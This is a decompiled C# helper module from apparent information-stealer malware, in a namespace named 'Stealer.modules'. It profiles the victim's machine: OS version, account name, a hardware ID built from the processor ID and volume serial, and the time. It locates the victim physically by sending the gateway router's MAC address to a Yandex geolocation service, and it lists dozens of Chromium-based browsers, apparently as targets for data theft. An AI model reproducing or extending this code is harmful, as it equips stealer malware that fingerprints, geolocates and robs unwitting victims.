using System;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Xml;

namespace Stealer.modules
{
	// Token: 0x02000018 RID: 24
	public class Help
	{
		// Token: 0x06000083 RID: 131 RVA: 0x00006E9C File Offset: 0x0000509C
		public static string Windows()
		{
			foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				try
				{
					return ((string)managementObject["Caption"]).Trim() + "(" + (string)managementObject["OSArchitecture"] + ")";
				}
				catch
				{
				}
			}
			return "Unknown";
		}

		// Token: 0x06000084 RID: 132 RVA: 0x00006F40 File Offset: 0x00005140
		public static string GetTime()
		{
			try
			{
				return DateTime.Now.ToString();
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x06000085 RID: 133 RVA: 0x00006F80 File Offset: 0x00005180
		public static string AccountName()
		{
			foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_UserAccount").Get())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				try
				{
					return managementObject.GetPropertyValue("Name").ToString();
				}
				catch
				{
				}
			}
			return "Unknown";
		}

		// Token: 0x06000086 RID: 134 RVA: 0x00007004 File Offset: 0x00005204
		public static string LocationFind()
		{
			string result = string.Empty;
			try
			{
				string mac_addr = Help.viewResult();
				result = Help.FindFromMac(mac_addr);
			}
			catch
			{
			}
			return result;
		}

		// Token: 0x06000087 RID: 135 RVA: 0x0000703C File Offset: 0x0000523C
		private static string viewResult()
		{
			string result = string.Empty;
			try
			{
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT DefaultIPGateway FROM Win32_NetworkAdapterConfiguration");
				foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
				{
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					string[] array = (string[])managementObject["DefaultIPGateway"];
					if (array != null)
					{
						result = Help.ConvertIpToMAC(IPAddress.Parse(array[0]));
					}
				}
			}
			catch
			{
			}
			return result;
		}

		// Token: 0x06000088 RID: 136 RVA: 0x000070D4 File Offset: 0x000052D4
		private static IPAddress DoGetHostAddresses(string hostname)
		{
			IPAddress[] hostAddresses = Dns.GetHostAddresses(hostname);
			return hostAddresses[0];
		}

		// Token: 0x06000089 RID: 137
		[DllImport("iphlpapi.dll", ExactSpelling = true)]
		private static extern int SendARP(int DestIP, int SrcIP, [Out] byte[] pMacAddr, ref int PhyAddrLen);

		// Token: 0x0600008A RID: 138 RVA: 0x000070EC File Offset: 0x000052EC
		private static string ConvertIpToMAC(IPAddress ip)
		{
			byte[] array = new byte[6];
			int num = array.Length;
			Help.SendARP(ip.GetHashCode(), 0, array, ref num);
			return BitConverter.ToString(array, 0, 6);
		}

		// Token: 0x0600008B RID: 139 RVA: 0x0000711C File Offset: 0x0000531C
		private static string FindFromMac(string mac_addr)
		{
			string result = string.Empty;
			try
			{
				string bssid = mac_addr.Replace("-", "");
				string xml = Help.Th(bssid);
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.LoadXml(xml);
				foreach (object obj in xmlDocument.DocumentElement)
				{
					XmlNode xmlNode = (XmlNode)obj;
					if (xmlNode.Attributes.Count > 0)
					{
						result = "https://www.google.ru/maps/search/" + xmlNode.Attributes.GetNamedItem("latitude").Value + " " + xmlNode.Attributes.GetNamedItem("longitude").Value;
					}
				}
			}
			catch
			{
			}
			return result;
		}

		// Token: 0x0600008C RID: 140 RVA: 0x00007200 File Offset: 0x00005400
		private static string Th(string bssid)
		{
			string result = string.Empty;
			try
			{
				StreamReader streamReader = new StreamReader(WebRequest.Create("http://mobile.maps.yandex.net/cellid_location/?clid=1866854&lac=-1&cellid=-1&operatorid=null&countrycode=null&signalstrength=-1&wifinetworks=" + bssid + ":-65&app=ymetro ").GetResponse().GetResponseStream());
				result = streamReader.ReadToEnd();
				streamReader.Close();
			}
			catch
			{
			}
			return result;
		}

		// Token: 0x0600008D RID: 141 RVA: 0x0000725C File Offset: 0x0000545C
		private static string GetHwid()
		{
			string result = "";
			try
			{
				string str = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
				ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + str + ":\"");
				managementObject.Get();
				string text = managementObject["VolumeSerialNumber"].ToString();
				result = text;
			}
			catch
			{
			}
			return result;
		}

		// Token: 0x0600008E RID: 142 RVA: 0x000072C4 File Offset: 0x000054C4
		private static string GetProcessorID()
		{
			string result = "";
			string queryString = "SELECT ProcessorId FROM Win32_Processor";
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(queryString);
			ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
			foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				result = (string)managementObject["ProcessorId"];
			}
			return result;
		}

		// Token: 0x04000037 RID: 55
		public static string[] BrowsersName = new string[]
		{
			"Chrome",
			"Edge",
			"Chromium",
			"Yandex",
			"Orbitum",
			"Atom",
			"Kometa",
			"Opera",
			"Brave-Browser",
			"Amigo",
			"Torch",
			"Comodo",
			"CentBrowser",
			"uCozMedia",
			"Chromodo",
			"Rockmelt",
			"Sleipnir",
			"Slimjet",
			"360Browser",
			"SRWare Iron",
			"Vivaldi",
			"Sputnik",
			"Nichrome",
			"CocCoc",
			"Maxthon",
			"K-Melon",
			"AcWebBrowser",
			"Epic Privacy Browser",
			"Maple Studio",
			"Black Hawk",
			"Flock",
			"CoolNovo",
			"Baidu Spark",
			"Titan Browser",
			"Google",
			"browser"
		};

		// Token: 0x04000038 RID: 56
		public static string HWID = Help.GetProcessorID() + Help.GetHwid();
	}
}
